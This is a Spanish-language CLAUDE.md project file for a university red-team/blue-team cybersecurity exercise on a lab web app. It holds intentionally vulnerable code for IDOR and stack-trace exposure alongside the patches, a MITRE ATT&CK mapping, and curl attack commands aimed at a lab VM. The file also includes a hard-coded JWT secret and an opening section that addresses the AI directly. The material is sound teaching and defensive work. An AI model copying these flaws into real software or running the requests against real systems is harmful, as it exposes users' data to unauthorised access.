# CLAUDE.md — Contexto del Proyecto: AutoApply Bot
## Simulación de Ataque Informático y Remediación

---

## ⚠️ CONTEXTO ÉTICO Y LEGAL — LEE ESTO PRIMERO

Este es un **proyecto académico de ciberseguridad** de la Universidad Católica Andrés Bello (UCAB), materia Ciberseguridad 2025-2026, Prof. Gustavo Lara Jr.

**TODO lo que se hace aquí es:**
- Educativo y controlado
- Ejecutado en un entorno virtualizado completamente aislado (VirtualBox)
- Sobre una aplicación web que el propio equipo desarrolló/adaptó
- Jamás sobre sistemas reales, externos o de terceros

**La aplicación víctima corre en:**
- Una VM local Ubuntu Server 22.04 en VirtualBox
- IP estática: `192.168.5.20`
- No tiene salida a internet en la red interna del laboratorio
- Solo es accesible desde la VM Kali Linux atacante (`192.168.5.10`)

Cuando se habla de "atacar", "explotar" o "payload", todo ocurre dentro de esta red interna entre dos VMs en la misma computadora física. No hay ningún sistema externo involucrado.

---

## 📋 Descripción del Proyecto

**Título:** "Simulación de Ataque Informático y Remediación sobre una Aplicación Web Vulnerable"

**Objetivo:** Desarrollar, atacar y remediar una aplicación web con vulnerabilidades intencionalmente implementadas, siguiendo OWASP Top 10:2025, usando MITRE ATT&CK® como marco metodológico.

**Repositorio:** `https://github.com/nahomyrada/ciberseguridad-proyecto-2026`

---

## 🏗️ La Aplicación: AutoApply Bot

Plataforma que automatiza postulaciones freelance con IA (Google Gemini). No fue construida desde cero para este proyecto — es una app existente a la que se le agregaron vulnerabilidades intencionalmente.

### Stack tecnológico
- **Backend:** Node.js 20 + TypeScript + Express + PostgreSQL + JWT
- **Frontend:** Next.js 14 + TypeScript + TailwindCSS + Recharts + Axios
- **Base de datos:** PostgreSQL (base de datos: `autoapply`, puerto 5432)
- **Puertos:** Backend en `3001`, Frontend en `3000`

### Estructura del repositorio
```
ciberseguridad-proyecto-2026/
├── backend/
│   └── src/
│       ├── config/database.ts
│       ├── controllers/
│       │   ├── proposalController.ts   ← VECTOR DE ATAQUE IDOR
│       │   ├── authController.ts
│       │   ├── jobController.ts
│       │   └── ...
│       ├── middleware/
│       │   ├── auth.ts                 ← JWT middleware
│       │   └── errorHandler.ts        ← VECTOR DE ATAQUE A10:2025
│       ├── models/
│       ├── routes/
│       └── utils/seed.ts
├── frontend/
│   └── src/app/
│       ├── login/
│       ├── register/
│       └── dashboard/
│           ├── proposals/             ← UI del vector IDOR
│           ├── jobs/
│           ├── earnings/
│           └── skills/
├── database/schema.sql
└── scripts/
    └── payloads.sh                    ← Scripts de ataque documentados
```

---

## 🌿 Ramas del Repositorio

| Rama | Propósito |
|---|---|
| `main` | README general, documentación, instrucciones de despliegue |
| `version-vulnerable` | Código con vulnerabilidades intencionalmente implementadas |
| `version-sanitizada` | Código con parches y contramedidas aplicadas |

**Regla:** Red Team trabaja en `version-vulnerable`, Blue Team en `version-sanitizada`.

---

## 🔬 Entorno de Laboratorio

### VMs en VirtualBox (misma máquina física — mini PC Windows 32GB RAM)

| VM | SO | RAM | IP | Rol |
|---|---|---|---|---|
| Kali Linux 2026.1 | Kali Linux | 4 GB | `192.168.5.10` | Atacante — Red Team |
| Ubuntu-Victima | Ubuntu Server 22.04 LTS | 2 GB | `192.168.5.20` | Víctima — Blue Team |

### Red
- **Adaptador 1:** NAT (internet para dependencias)
- **Adaptador 2:** Red Interna `vboxnet-proyecto` (laboratorio aislado)
- IPs estáticas configuradas con Netplan en Ubuntu
- Conectividad verificada: ping exitoso entre ambas VMs

### Acceso SSH al servidor víctima
```bash
ssh ubuntu@localhost -p 2222
```

---

## 🛡️ Vulnerabilidades del Proyecto

### Vulnerabilidad 1 — IDOR / Broken Access Control
- **Clasificación OWASP:** A01:2025 Broken Access Control
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284
- **Archivo:** `backend/src/controllers/proposalController.ts`
- **Estado:** Ya implementada (existía en el código original)

**Descripción técnica:**
Los controladores de propuestas no verifican que el recurso solicitado pertenezca al usuario autenticado. Cualquier usuario con un JWT válido puede:
- Leer propuestas de otros usuarios (`GET /api/proposals/:id`)
- Ver todas las propuestas sin filtro (`GET /api/proposals`)
- Cambiar el estado de propuestas ajenas (`PATCH /api/proposals/:id/status`)
- Eliminar propuestas de otros usuarios (`DELETE /api/proposals/:id`)

**Código vulnerable actual:**
```typescript
// SIN validación de propiedad — cualquier :id es accesible
export const getProposalById = async (req: Request, res: Response) => {
    const proposal = await ProposalModel.findById(parseInt(req.params.id));
    // No verifica: proposal.user_id === req.userId
    res.json({ success: true, data: proposal });
};
```

**Parche (version-sanitizada):**
```typescript
export const getProposalById = async (req: Request, res: Response) => {
    const proposal = await ProposalModel.findById(parseInt(req.params.id));
    if (proposal.user_id !== req.userId) {
        res.status(403).json({ success: false, message: 'Acceso denegado' });
        return;
    }
    res.json({ success: true, data: proposal });
};
```

---

### Vulnerabilidad 2 — Mishandling of Exceptional Conditions
- **Clasificación OWASP:** A10:2025 Mishandling of Exceptional Conditions
- **CWE:** CWE-209 (Information Exposure Through an Error Message)
- **Archivo:** `backend/src/middleware/errorHandler.ts`
- **Estado:** Ya modificado en version-vulnerable

**Descripción técnica:**
El middleware de manejo de errores expone información interna del sistema directamente en la respuesta HTTP: stack traces, nombres de tablas de base de datos, rutas del servidor, versión de Node.js y arquitectura del sistema.

**Código vulnerable actual (version-vulnerable):**
```typescript
export const errorHandler = (err: Error, req: Request, res: Response, next: NextFunction): void => {
    res.status(500).json({
        success: false,
        message: err.message,          // Expone mensaje interno
        error: err.stack,              // Expone stack trace completo
        details: {
            name: err.name,
            path: req.path,
            method: req.method,
            timestamp: new Date().toISOString()
        }
    });
};
```

**Parche (version-sanitizada):**
```typescript
export const errorHandler = (err: Error, req: Request, res: Response, next: NextFunction): void => {
    console.error('Error interno:', err.stack); // Solo en logs del servidor
    res.status(500).json({
        success: false,
        message: 'Error interno del servidor' // Sin detalles técnicos
    });
};
```

---

## ⚔️ Marco Metodológico: MITRE ATT&CK®

El ataque se mapea usando MITRE ATT&CK® Enterprise:

| Fase | Táctica | Técnica | Acción |
|---|---|---|---|
| 1 | TA0043 Reconnaissance | T1592, T1595 | Nmap scan + forzar errores para obtener stack trace |
| 2 | TA0001 Initial Access | T1078 | Registrar cuenta legítima, obtener JWT |
| 3 | TA0007 Discovery | T1518 | Enumerar IDs de propuestas iterando :id |
| 4 | TA0009 Collection | T1213 | GET /api/proposals sin filtro → todos los datos |
| 5 | TA0010 Exfiltration | T1567 | Modificar/eliminar propuestas ajenas |

---

## 📜 Scripts de Ataque (scripts/payloads.sh)

```bash
# FASE 1: RECONOCIMIENTO — Extraer info del sistema forzando error
curl -X POST http://192.168.5.20:3001/api/proposals \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [TOKEN]" \
  -d '{"job_offer_id": "esto_no_es_numero"}'
# Resultado esperado: stack trace con info de DB y servidor

# FASE 2: ACCESO INICIAL — Obtener JWT
curl -X POST http://192.168.5.20:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Attack123!"}'

# FASE 3-4: DESCUBRIMIENTO Y RECOLECCIÓN — IDOR
curl -X GET http://192.168.5.20:3001/api/proposals \
  -H "Authorization: Bearer [TOKEN_ATACANTE]"

curl -X GET http://192.168.5.20:3001/api/proposals/1 \
  -H "Authorization: Bearer [TOKEN_ATACANTE]"

# FASE 5: EXFILTRACIÓN — Modificar y eliminar recursos ajenos
curl -X PATCH http://192.168.5.20:3001/api/proposals/1/status \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [TOKEN_ATACANTE]" \
  -d '{"status":"rejected"}'

curl -X DELETE http://192.168.5.20:3001/api/proposals/1 \
  -H "Authorization: Bearer [TOKEN_ATACANTE]"
```

---

## 👥 Equipo y Roles

| Integrante | Team | Rol | Rama principal |
|---|---|---|---|
| Baladi, Anthonny | 🔴 Red | Líder Ofensivo — MITRE ATT&CK® mapping | version-vulnerable |
| Gómez, Ronald | 🔴 Red | Reconocimiento — Nmap, ZAP | version-vulnerable |
| Rada, Nahomy | 🔴 Red | Explotación — payloads, evidencias | version-vulnerable |
| Castellano, Gabriel | 🔵 Blue | Líder Defensivo — parches IDOR | version-sanitizada |
| Cova, César | 🔵 Blue | Infraestructura — lab, red, VMs | version-sanitizada |
| Ojeda, José | 🔵 Blue | Hardening — errorHandler, Winston | version-sanitizada |

---

## 📦 Convención de Commits

```
[RED] Acción: descripción específica
[BLUE] Acción: descripción específica

Ejemplos:
[RED] Add IDOR payload for proposal deletion endpoint
[RED] Add exploitation evidence screenshots (Phase 3 MITRE)
[BLUE] Fix IDOR: add ownership validation in proposalController
[BLUE] Fix A10:2025: restrict error details to server logs only
```

---

## 🚀 Despliegue en Ubuntu Víctima

```bash
# Clonar y cambiar a rama vulnerable
git clone https://github.com/nahomyrada/ciberseguridad-proyecto-2026.git
cd ciberseguridad-proyecto-2026
git checkout version-vulnerable

# Base de datos
cat database/schema.sql | sudo -u postgres psql -d autoapply

# Backend (.env)
# DB_URL=postgresql://postgres@localhost/autoapply
# JWT_SECRET=ciberseguridad-ucab-2026
# PORT=3001
# NODE_ENV=development
cd backend && npm install && npm run seed && npm run dev

# Frontend (fix SWC para Linux)
cd frontend
cat > .babelrc << 'EOF'
{"presets": ["next/babel"]}
EOF
npm install && npm run dev
```

**Credenciales demo:** `demo@autoapply.com` / `Demo1234!`

---

## 📋 Entregas Pendientes

| Entrega | Fecha | Valor | Estado |
|---|---|---|---|
| Anteproyecto | Semana 8 | 3% | ✅ Entregado |
| Avance | Semana 12 | 2% | ❌ No entregado |
| Video teórico | Semana 15 | 10% | ⏳ Pendiente |
| Implementación + docs | Semana 15 | 12.5% | 🔄 En progreso |
| Defensa en vivo | Semana 15 | 10% | ⏳ Pendiente |

---

## 🎯 Lo que Falta por Hacer

### Red Team (Nahomy + Ronald + Anthonny)
- [ ] Ejecutar payloads en vivo y capturar evidencias en `docs/evidence/`
- [ ] Crear `docs/exploitation-report.md`
- [ ] Crear `docs/mitre-attack-mapping.md`
- [ ] Crear `docs/impact-analysis.md`
- [ ] Actualizar `payloads.sh` con tokens y resultados reales

### Blue Team (Gabriel + César + José)
- [ ] Parchear `proposalController.ts` en `version-sanitizada`
- [ ] Parchear `errorHandler.ts` en `version-sanitizada`
- [ ] Agregar Winston logging
- [ ] Crear `docs/remediation-report.md`
- [ ] Demostrar que payloads ya no funcionan

### Todos
- [ ] README completo en `main`
- [ ] Video exposición teórica
- [ ] Preparar demo en vivo para defensa
